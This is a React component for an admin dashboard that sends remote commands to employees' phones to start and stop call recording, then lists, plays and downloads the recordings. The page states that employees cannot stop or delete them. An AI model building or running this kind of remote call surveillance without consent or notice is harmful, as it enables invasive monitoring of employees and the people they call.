import { useState, useEffect, useRef } from 'react';
import {
  Box, Typography, Paper, List, ListItem, ListItemIcon, ListItemText,
  IconButton, Button, Dialog, DialogTitle, DialogContent, DialogActions,
  TextField, Chip, Alert, CircularProgress, Grid, Card, CardContent, Tooltip
} from '@mui/material';
import {
  PhoneAndroid, Phone, PlayArrow, Pause, Stop, Download, Delete,
  Refresh, Audiotrack, FiberManualRecord, AccessTime
} from '@mui/icons-material';
import { employeeAPI, callRecordingAPI } from '../services/api';

export default function CallRecordings() {
  const [employees, setEmployees] = useState([]);
  const [selectedEmployee, setSelectedEmployee] = useState(null);
  const [recordings, setRecordings] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [playingFile, setPlayingFile] = useState(null);
  const [adminSecret, setAdminSecret] = useState('');
  const [deleteDialog, setDeleteDialog] = useState(null);
  const audioRef = useRef(null);

  useEffect(() => {
    loadEmployees();
  }, []);

  useEffect(() => {
    if (selectedEmployee) {
      loadRecordings(selectedEmployee.employee_id);
    }
  }, [selectedEmployee]);

  const loadEmployees = async () => {
    try {
      const res = await employeeAPI.getAll();
      const data = (res.data.data || res.data || []).map(e => ({
        ...e,
        employee_id: e.employeeId || e.employee_id || e._id
      }));
      setEmployees(data);
    } catch (e) {
      console.error('Failed to load employees:', e);
    }
  };

  const loadRecordings = async (empId) => {
    setLoading(true);
    setError('');
    try {
      await callRecordingAPI.sendCommand(empId, 'list_call_recordings', {});
      setTimeout(async () => {
        try {
          const res = await callRecordingAPI.getListings(empId);
          setRecordings(res.data.recordings || []);
        } catch (e) {
          setError('No recordings data yet. Wait a moment and refresh.');
        }
        setLoading(false);
      }, 2000);
    } catch (e) {
      setError('Failed to load recordings');
      setLoading(false);
    }
  };

  const handleStartRecording = async () => {
    if (!selectedEmployee) return;
    try {
      await callRecordingAPI.sendCommand(selectedEmployee.employee_id, 'start_call_record', {});
      setError('');
      setTimeout(() => loadRecordings(selectedEmployee.employee_id), 3000);
    } catch (e) {
      setError('Failed to start recording');
    }
  };

  const handleStopRecording = async () => {
    if (!selectedEmployee) return;
    try {
      await callRecordingAPI.sendCommand(selectedEmployee.employee_id, 'stop_call_record', {});
      setTimeout(() => loadRecordings(selectedEmployee.employee_id), 2000);
    } catch (e) {
      setError('Failed to stop recording');
    }
  };

  const handlePlay = (recording) => {
    if (playingFile === recording.file_name) {
      if (audioRef.current) {
        audioRef.current.pause();
        audioRef.current = null;
      }
      setPlayingFile(null);
      return;
    }

    setPlayingFile(recording.file_name);

    callRecordingAPI.download(selectedEmployee.employee_id, recording.file_name)
      .then((res) => {
        const url = URL.createObjectURL(res.data);
        if (audioRef.current) audioRef.current.pause();
        audioRef.current = new Audio(url);
        audioRef.current.play();
        audioRef.current.onended = () => setPlayingFile(null);
      })
      .catch(() => setError('Failed to load recording'));
  };

  const handleDownload = async (recording) => {
    if (!selectedEmployee) return;
    try {
      const res = await callRecordingAPI.download(selectedEmployee.employee_id, recording.file_name);
      const url = URL.createObjectURL(res.data);
      const a = document.createElement('a');
      a.href = url;
      a.download = recording.file_name;
      a.click();
      URL.revokeObjectURL(url);
    } catch (e) {
      setError('Download failed');
    }
  };

  const handleDelete = async () => {
    if (!selectedEmployee || !deleteDialog || !adminSecret) return;
    try {
      await callRecordingAPI.delete(selectedEmployee.employee_id, deleteDialog.file_name, adminSecret);
      setDeleteDialog(null);
      setAdminSecret('');
      loadRecordings(selectedEmployee.employee_id);
    } catch (e) {
      setError(e.response?.data?.message || 'Delete failed - wrong admin secret?');
    }
  };

  return (
    <Box>
      <Typography variant="h5" fontWeight="bold" mb={3}>Call Recordings</Typography>

      <Alert severity="warning" sx={{ mb: 3 }}>
        Call recordings cannot be stopped or deleted by employees. Only admins with the secret key can delete recordings.
      </Alert>

      <Grid container spacing={2} mb={3}>
        {employees.map((emp) => (
          <Grid item xs={12} sm={6} md={4} key={emp.employee_id}>
            <Card
              sx={{
                cursor: 'pointer',
                border: selectedEmployee?.employee_id === emp.employee_id ? '2px solid #1976D2' : '1px solid #e0e0e0',
                '&:hover': { boxShadow: 3 }
              }}
              onClick={() => { setSelectedEmployee(emp); setRecordings([]); }}
            >
              <CardContent sx={{ display: 'flex', alignItems: 'center', gap: 2 }}>
                <PhoneAndroid color={selectedEmployee?.employee_id === emp.employee_id ? 'primary' : 'action'} />
                <Box>
                  <Typography fontWeight="bold">{emp.name || emp.employee_id}</Typography>
                  <Typography variant="caption" color="text.secondary">{emp.employee_id}</Typography>
                </Box>
              </CardContent>
            </Card>
          </Grid>
        ))}
      </Grid>

      {selectedEmployee && (
        <Paper sx={{ p: 2 }}>
          <Box sx={{ display: 'flex', gap: 1, mb: 2, alignItems: 'center', flexWrap: 'wrap' }}>
            <Typography variant="subtitle1" fontWeight="bold" sx={{ mr: 'auto' }}>
              {selectedEmployee.name || selectedEmployee.employee_id} - Recordings
            </Typography>
            <Button size="small" startIcon={<Refresh />} onClick={() => loadRecordings(selectedEmployee.employee_id)}>
              Refresh
            </Button>
            <Button size="small" variant="contained" color="success" startIcon={<FiberManualRecord />} onClick={handleStartRecording}>
              Start Recording
            </Button>
            <Button size="small" variant="contained" color="error" startIcon={<Stop />} onClick={handleStopRecording}>
              Stop Recording
            </Button>
          </Box>

          {error && <Alert severity="info" sx={{ mb: 2 }} onClose={() => setError('')}>{error}</Alert>}

          {loading ? (
            <Box sx={{ display: 'flex', justifyContent: 'center', p: 4 }}>
              <CircularProgress />
            </Box>
          ) : recordings.length === 0 ? (
            <Alert severity="info">No recordings found. Call recordings appear here after phone calls are made.</Alert>
          ) : (
            <List>
              {recordings.map((rec, i) => (
                <ListItem
                  key={i}
                  sx={{
                    borderBottom: '1px solid #f0f0f0',
                    display: 'flex',
                    alignItems: 'center',
                    gap: 1
                  }}
                >
                  <ListItemIcon sx={{ minWidth: 40 }}>
                    <Audiotrack color={playingFile === rec.file_name ? 'primary' : 'action'} />
                  </ListItemIcon>
                  <ListItemText
                    primary={rec.file_name}
                    secondary={
                      <Box component="span" sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                        <Chip icon={<AccessTime />} label={rec.uploaded_at || 'Unknown'} size="small" variant="outlined" />
                        <Chip label={rec.size_human || `${(rec.file_size / 1024).toFixed(1)} KB`} size="small" variant="outlined" />
                        {rec.duration_ms && (
                          <Chip label={`${(rec.duration_ms / 1000).toFixed(0)}s`} size="small" variant="outlined" />
                        )}
                      </Box>
                    }
                  />
                  <Box sx={{ display: 'flex', gap: 0.5 }}>
                    <Tooltip title={playingFile === rec.file_name ? 'Stop' : 'Play'}>
                      <IconButton size="small" onClick={() => handlePlay(rec)}>
                        {playingFile === rec.file_name ? <Pause /> : <PlayArrow />}
                      </IconButton>
                    </Tooltip>
                    <Tooltip title="Download">
                      <IconButton size="small" onClick={() => handleDownload(rec)}>
                        <Download />
                      </IconButton>
                    </Tooltip>
                    <Tooltip title="Delete (Admin only)">
                      <IconButton size="small" color="error" onClick={() => setDeleteDialog(rec)}>
                        <Delete />
                      </IconButton>
                    </Tooltip>
                  </Box>
                </ListItem>
              ))}
            </List>
          )}
        </Paper>
      )}

      <Dialog open={!!deleteDialog} onClose={() => { setDeleteDialog(null); setAdminSecret(''); }}>
        <DialogTitle>Delete Recording</DialogTitle>
        <DialogContent>
          <Typography mb={2}>
            Are you sure you want to delete <strong>{deleteDialog?.file_name}</strong>?
          </Typography>
          <Typography variant="caption" color="text.secondary" mb={2} display="block">
            This action requires the admin secret key. The employee cannot delete recordings.
          </Typography>
          <TextField
            fullWidth
            type="password"
            label="Admin Secret"
            value={adminSecret}
            onChange={(e) => setAdminSecret(e.target.value)}
            placeholder="Enter admin secret key"
          />
        </DialogContent>
        <DialogActions>
          <Button onClick={() => { setDeleteDialog(null); setAdminSecret(''); }}>Cancel</Button>
          <Button
            variant="contained"
            color="error"
            disabled={!adminSecret}
            onClick={handleDelete}
          >
            Delete Permanently
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}
